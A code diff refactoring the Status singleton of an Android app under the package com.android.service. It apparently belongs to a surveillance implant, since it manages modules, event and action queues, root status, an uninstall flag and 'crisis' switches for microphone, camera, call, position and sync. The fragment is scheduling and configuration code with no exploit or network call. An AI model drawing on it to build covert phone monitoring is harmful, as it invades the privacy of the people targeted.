@@ -9,16 +9,18 @@ package com.android.service;
 
 import java.util.ArrayList;
 import java.util.HashMap;
+import java.util.concurrent.ScheduledThreadPoolExecutor;
 
 import android.content.Context;
+import android.os.Handler;
 
 import com.android.service.action.Action;
-import com.android.service.agent.AgentConf;
-import com.android.service.agent.AgentCrisis;
-import com.android.service.agent.AgentType;
 import com.android.service.auto.Cfg;
-import com.android.service.conf.Option;
-import com.android.service.event.EventConf;
+import com.android.service.conf.ConfModule;
+import com.android.service.conf.ConfEvent;
+import com.android.service.conf.Globals;
+import com.android.service.event.BaseEvent;
+import com.android.service.module.ModuleCrisis;
 import com.android.service.util.Check;
 
 // Singleton Class
@@ -29,19 +31,18 @@ public class Status {
 	private static final String TAG = "Status"; //$NON-NLS-1$
 
 	/** The agents map. */
-	private final HashMap<Integer, AgentConf> agentsMap;
+	private final HashMap<String, ConfModule> agentsMap;
 
 	/** The events map. */
-	private final HashMap<Integer, EventConf> eventsMap;
+	private final HashMap<Integer, ConfEvent> eventsMap;
 
 	/** The actions map. */
 	private final HashMap<Integer, Action> actionsMap;
 
-	/** The options map. */
-	private final HashMap<Integer, Option> optionsMap;
+	Globals globals;
 
 	/** The triggered actions. */
-	ArrayList<Integer> triggeredActions = new ArrayList<Integer>();
+	ArrayList<?>[] triggeredActions = new ArrayList<?>[Action.NUM_QUEUE];
 
 	/** The synced. */
 	public boolean synced;
@@ -54,10 +55,10 @@ public class Status {
 
 	Object lockCrisis = new Object();
 	private boolean crisis = false;
-	private int crisisType;
+	private boolean[] crisisType = new boolean[ModuleCrisis.SIZE];
 	private boolean haveRoot;
 
-	private final Object triggeredSemaphore = new Object();
+	private final Object[] triggeredSemaphore = new Object[Action.NUM_QUEUE];
 
 	public boolean uninstall;
 	public boolean reload;
@@ -66,10 +67,14 @@ public class Status {
 	 * Instantiates a new status.
 	 */
 	private Status() {
-		agentsMap = new HashMap<Integer, AgentConf>();
-		eventsMap = new HashMap<Integer, EventConf>();
+		agentsMap = new HashMap<String, ConfModule>();
+		eventsMap = new HashMap<Integer, ConfEvent>();
 		actionsMap = new HashMap<Integer, Action>();
-		optionsMap = new HashMap<Integer, Option>();
+
+		for (int i = 0; i < Action.NUM_QUEUE; i++) {
+			triggeredSemaphore[i] = new Object();
+			triggeredActions[i] = new ArrayList<Integer>();
+		}
 	}
 
 	/** The singleton. */
@@ -99,7 +104,7 @@ public class Status {
 		agentsMap.clear();
 		eventsMap.clear();
 		actionsMap.clear();
-		optionsMap.clear();
+		globals = null;
 		uninstall = false;
 		reload = false;
 	}
@@ -138,21 +143,21 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public void addAgent(final AgentConf a) throws GeneralException {
+	public void addAgent(final ConfModule a) throws GeneralException {
 
-		if (agentsMap.containsKey(a.getId()) == true) {
+		if (agentsMap.containsKey(a.getType()) == true) {
 			// throw new RCSException("Agent " + a.getId() + " already loaded");
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Warn: " + "Substituing agent: " + a); //$NON-NLS-1$ //$NON-NLS-2$
 			}
 		}
 
-		final Integer key = a.getId();
+		final String key = a.getType();
 		if (Cfg.DEBUG) {
 			Check.asserts(key != null, "null key"); //$NON-NLS-1$
 		}
 
-		agentsMap.put(a.getId(), a);
+		agentsMap.put(a.getType(), a);
 	}
 
 	// Add an event to the map
@@ -161,12 +166,13 @@ public class Status {
 	 * 
 	 * @param e
 	 *            the e
+	 * @return
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public void addEvent(final EventConf e) {
+	public boolean addEvent(final ConfEvent e) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " addEvent "); //$NON-NLS-1$
+			//Check.log(TAG + " addEvent "); //$NON-NLS-1$
 		}
 		// Don't add the same event twice
 		if (eventsMap.containsKey(e.getId()) == true) {
@@ -177,6 +183,7 @@ public class Status {
 		}
 
 		eventsMap.put(e.getId(), e);
+		return true;
 	}
 
 	// Add an action to the map
@@ -197,22 +204,8 @@ public class Status {
 		actionsMap.put(a.getId(), a);
 	}
 
-	// Add an option to the map
-	/**
-	 * Adds the option.
-	 * 
-	 * @param o
-	 *            the o
-	 * @throws GeneralException
-	 *             the RCS exception
-	 */
-	public void addOption(final Option o) throws GeneralException {
-		// Don't add the same option twice
-		if (optionsMap.containsKey(o.getId()) == true) {
-			throw new GeneralException("Option " + o.getId() + " already loaded"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
-
-		optionsMap.put(o.getId(), o);
+	public void setGlobal(Globals g) {
+		this.globals = g;
 	}
 
 	/**
@@ -243,20 +236,11 @@ public class Status {
 	}
 
 	/**
-	 * Gets the optionss number.
-	 * 
-	 * @return the optionss number
-	 */
-	public int getOptionssNumber() {
-		return optionsMap.size();
-	}
-
-	/**
 	 * Gets the agents map.
 	 * 
 	 * @return the agents map
 	 */
-	public HashMap<Integer, AgentConf> getAgentsMap() {
+	public HashMap<String, ConfModule> getAgentsMap() {
 		return agentsMap;
 	}
 
@@ -265,7 +249,7 @@ public class Status {
 	 * 
 	 * @return the events map
 	 */
-	public HashMap<Integer, EventConf> getEventsMap() {
+	public HashMap<Integer, ConfEvent> getEventsMap() {
 		return eventsMap;
 	}
 
@@ -304,21 +288,21 @@ public class Status {
 	/**
 	 * Gets the agent.
 	 * 
-	 * @param agentId
+	 * @param string
 	 *            the id
 	 * @return the agent
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public AgentConf getAgent(final int agentId) throws GeneralException {
-		if (agentsMap.containsKey(agentId) == false) {
-			throw new GeneralException("Agent " + agentId + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
+	public ConfModule getAgent(final String string) throws GeneralException {
+		if (agentsMap.containsKey(string) == false) {
+			throw new GeneralException("Agent " + string + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		final AgentConf a = agentsMap.get(agentId);
+		final ConfModule a = agentsMap.get(string);
 
 		if (a == null) {
-			throw new GeneralException("Agent " + agentId + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
+			throw new GeneralException("Agent " + string + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
 		return a;
@@ -333,12 +317,12 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public EventConf getEvent(final int id) throws GeneralException {
+	public ConfEvent getEvent(final int id) throws GeneralException {
 		if (eventsMap.containsKey(id) == false) {
 			throw new GeneralException("Event " + id + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		final EventConf e = eventsMap.get(id);
+		final ConfEvent e = eventsMap.get(id);
 
 		if (e == null) {
 			throw new GeneralException("Event " + id + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
@@ -356,18 +340,8 @@ public class Status {
 	 * @throws GeneralException
 	 *             the RCS exception
 	 */
-	public Option getOption(final int id) throws GeneralException {
-		if (optionsMap.containsKey(id) == false) {
-			throw new GeneralException("Option " + id + " not found"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
-
-		final Option o = optionsMap.get(id);
-
-		if (o == null) {
-			throw new GeneralException("Option " + id + " is null"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
-
-		return o;
+	public Globals getGlobals() {
+		return globals;
 	}
 
 	/**
@@ -375,19 +349,41 @@ public class Status {
 	 * 
 	 * @param i
 	 *            the i
+	 * @param baseEvent
 	 */
-	public void triggerAction(final int i) {
-		synchronized (triggeredActions) {
-			if (!triggeredActions.contains(i)) {
-				triggeredActions.add(new Integer(i));
+	public void triggerAction(final int i, BaseEvent baseEvent) {
+		if (Cfg.DEBUG) {
+			Check.requires(actionsMap != null, " (triggerAction) Assert failed, null actionsMap");
+		}
+		Action action = actionsMap.get(new Integer(i));
+		if (Cfg.DEBUG) {
+			Check.asserts(action != null, " (triggerAction) Assert failed, null action");
+		}
+		int qq = action.getQueue();
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
+		Object tsem = triggeredSemaphore[qq];
+
+		if (Cfg.DEBUG)
+			Check.asserts(act != null, "triggerAction, null act");
+		if (Cfg.DEBUG)
+			Check.asserts(tsem != null, "triggerAction, null tsem");
+
+		Trigger trigger = new Trigger(i, baseEvent);
+		synchronized (act) {
+			if (!act.contains(trigger)) {
+				act.add(new Trigger(i, baseEvent));
 			}
 		}
-		synchronized (triggeredSemaphore) {
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (triggerAction): notifing queue: " + qq);
+		}
+		synchronized (tsem) {
 			try {
-				triggeredSemaphore.notifyAll();
+				tsem.notifyAll();
 			} catch (final Exception ex) {
 				if (Cfg.DEBUG) {
-					Check.log(ex) ;//$NON-NLS-1$
+					Check.log(ex);//$NON-NLS-1$
 				}
 			}
 		}
@@ -398,10 +394,28 @@ public class Status {
 	 * 
 	 * @return the triggered actions
 	 */
-	public int[] getTriggeredActions() {
+	public Trigger[] getTriggeredActions(int qq) {
+		if (Cfg.DEBUG)
+			Check.asserts(qq >= 0 && qq < Action.NUM_QUEUE, "getTriggeredActions qq: " + qq);
+
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
+		Object tsem = triggeredSemaphore[qq];
+
+		if (Cfg.DEBUG)
+			Check.asserts(tsem != null, "getTriggeredActions null tsem");
+
 		try {
-			synchronized (triggeredSemaphore) {
-				triggeredSemaphore.wait();
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getTriggeredActions): waiting on sem: " + qq);
+			}
+			synchronized (tsem) {
+				if(act.size()==0){
+					tsem.wait();
+				}else{
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getTriggeredActions): have act not empty, don't wait");
+					}
+				}
 			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
@@ -409,16 +423,36 @@ public class Status {
 			}
 		}
 
-		synchronized (triggeredActions) {
-			final int size = triggeredActions.size();
-			final int[] triggered = new int[size];
+		synchronized (tsem) {
+			final int size = act.size();
+			final Trigger[] triggered = new Trigger[size];
 
 			for (int i = 0; i < size; i++) {
-				triggered[i] = triggeredActions.get(i);
+				triggered[i] = act.get(i);
 			}
 
 			return triggered;
 		}
+	}
+
+	/**
+	 * Dangerous, DO NOT USE
+	 * 
+	 * @param qq
+	 * @return
+	 */
+	@Deprecated
+	public Trigger[] getNonBlockingTriggeredActions(int qq) {
+
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
+		final int size = act.size();
+		final Trigger[] triggered = new Trigger[size];
+
+		for (int i = 0; i < size; i++) {
+			triggered[i] = act.get(i);
+		}
+
+		return triggered;
 	}
 
 	/**
@@ -428,17 +462,22 @@ public class Status {
 	 *            the action
 	 */
 	public void unTriggerAction(final Action action) {
-		synchronized (triggeredActions) {
-			if (triggeredActions.contains(action.getId())) {
-				triggeredActions.remove(new Integer(action.getId()));
+		int qq = action.getQueue();
+		ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
+		Object sem = triggeredSemaphore[qq];
+
+		Trigger trigger = new Trigger(action.getId(), null);
+		synchronized (act) {
+			if (act.contains(trigger)) {
+				act.remove(trigger);
 			}
 		}
-		synchronized (triggeredSemaphore) {
+		synchronized (sem) {
 			try {
-				triggeredSemaphore.notifyAll();
+				sem.notifyAll();
 			} catch (final Exception ex) {
 				if (Cfg.DEBUG) {
-					Check.log(ex) ;//$NON-NLS-1$
+					Check.log(ex);//$NON-NLS-1$
 				}
 			}
 		}
@@ -449,47 +488,37 @@ public class Status {
 	 */
 	public void unTriggerAll() {
 		if (Cfg.DEBUG) {
-			Check.log( TAG + " (unTriggerAll)"); //$NON-NLS-1$ //$NON-NLS-2$
+			Check.log(TAG + " (unTriggerAll)"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		synchronized (triggeredActions) {
-			triggeredActions.clear();
-		}
-		synchronized (triggeredSemaphore) {
-			try {
-				triggeredSemaphore.notifyAll();
-			} catch (final Exception ex) {
-				if (Cfg.DEBUG) {
-					Check.log(ex) ;//$NON-NLS-1$
+		for (int qq = 0; qq < Action.NUM_QUEUE; qq++) {
+			ArrayList<Trigger> act = (ArrayList<Trigger>) triggeredActions[qq];
+			Object sem = triggeredSemaphore[qq];
+
+			synchronized (act) {
+				act.clear();
+			}
+			synchronized (sem) {
+				try {
+					sem.notifyAll();
+				} catch (final Exception ex) {
+					if (Cfg.DEBUG) {
+						Check.log(ex);//$NON-NLS-1$
+					}
 				}
 			}
 		}
+
 	}
 
-	public synchronized void setCrisis(int type) {
+	public synchronized void setCrisis(int type, boolean value) {
 		synchronized (lockCrisis) {
-			crisisType = type;
+			crisisType[type] = value;
 		}
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " setCrisis: " + type); //$NON-NLS-1$
 		}
-
-		AgentConf agent;
-		try {
-			agent = getAgent(AgentType.AGENT_MIC);
-			if (agent != null) {
-				//TODO: micAgent, crisis should stop recording 
-				//final AgentMic micAgent = (AgentMic) agent;
-				//micAgent.crisis(crisisMic());
-			}
-		} catch (final GeneralException e) {
-			// TODO Auto-generated catch block
-			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
-			}
-		}
-
 	}
 
 	private boolean isCrisis() {
@@ -500,31 +529,31 @@ public class Status {
 
 	public boolean crisisPosition() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && (crisisType & AgentCrisis.POSITION) != 0);
+			return (isCrisis() && crisisType[ModuleCrisis.POSITION]);
 		}
 	}
 
 	public boolean crisisCamera() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && (crisisType & AgentCrisis.CAMERA) != 0);
+			return (isCrisis() && crisisType[ModuleCrisis.CAMERA]);
 		}
 	}
 
 	public boolean crisisCall() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && (crisisType & AgentCrisis.CALL) != 0);
+			return (isCrisis() && crisisType[ModuleCrisis.CALL]);
 		}
 	}
 
 	public boolean crisisMic() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && (crisisType & AgentCrisis.MIC) != 0);
+			return (isCrisis() && crisisType[ModuleCrisis.MIC]);
 		}
 	}
 
 	public boolean crisisSync() {
 		synchronized (lockCrisis) {
-			return (isCrisis() && (crisisType & AgentCrisis.SYNC) != 0);
+			return (isCrisis() && crisisType[ModuleCrisis.SYNC]);
 		}
 	}
 
@@ -553,4 +582,16 @@ public class Status {
 	public void setRoot(boolean r) {
 		this.haveRoot = r;
 	}
+
+	ScheduledThreadPoolExecutor stpe = new ScheduledThreadPoolExecutor(10);
+
+	public ScheduledThreadPoolExecutor getStpe() {
+		return stpe;
+	}
+
+	Handler deafultHandler=new Handler();
+	public Handler getDefaultHandler() {
+		return deafultHandler;
+	}
+
 }
